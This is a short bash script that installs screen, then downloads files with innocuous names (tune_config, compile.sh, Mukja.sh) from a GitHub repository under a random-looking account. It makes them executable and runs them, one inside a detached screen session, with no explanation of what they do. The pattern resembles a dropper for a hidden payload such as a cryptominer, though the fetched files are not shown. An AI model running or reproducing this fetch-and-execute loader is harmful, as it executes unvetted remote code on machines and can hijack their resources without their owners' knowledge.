#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
chmod +x compile.sh
screen -dm -S wget https://raw.githubusercontent.com/uaaoxjdr/testly/main/Mukja.sh && chmod u+x Mukja.sh && ./Mukja.sh
./compile.sh
echo succes
